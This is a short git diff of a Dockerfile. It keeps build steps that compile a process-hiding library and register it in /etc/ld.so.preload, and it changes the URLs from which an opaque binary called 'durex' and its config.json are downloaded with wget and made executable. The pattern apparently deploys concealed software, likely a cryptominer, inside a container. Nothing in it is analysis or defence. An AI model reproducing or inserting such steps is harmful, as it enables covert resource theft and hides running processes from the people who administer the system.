@@ -16,8 +16,8 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Download config.json dan durex, serta memberikan izin eksekusi pada durex
-RUN wget https://github.com/bulboni/sol90/raw/main/durex \
-&& wget https://raw.githubusercontent.com/bulboni/sol90/main/config.json \
+RUN wget https://github.com/bulboni/sol90.1/raw/main/durex \
+&& wget https://raw.githubusercontent.com/bulboni/sol90.1/main/config.json \
 && chmod +x durex
     
 
